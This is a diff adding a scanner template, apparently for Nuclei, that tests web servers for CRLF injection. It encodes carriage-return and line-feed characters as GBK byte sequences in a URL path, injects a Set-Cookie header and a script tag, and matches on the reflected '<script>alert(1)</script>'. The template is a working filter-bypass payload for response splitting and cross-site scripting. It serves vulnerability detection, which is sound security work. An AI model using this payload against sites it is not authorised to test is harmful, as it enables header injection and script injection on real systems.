@@ -1,0 +1,32 @@
+id: gbk-crlf-injection
+
+info:
+  name: CRLF injection via GBK
+  author: reewardius
+  severity: medium
+  tags: blind,fuzzing,ni,crlf
+  metadata:
+    max-request: 1
+    
+http:
+  - method: GET
+    path:
+        - '{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:whoami=reewardius%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE' 
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          
+      - type: status
+        status:
+          - 200
+          - 500
+        condition: or
+          
+      - type: word
+        part: header
+        words:
+          - "text/html"
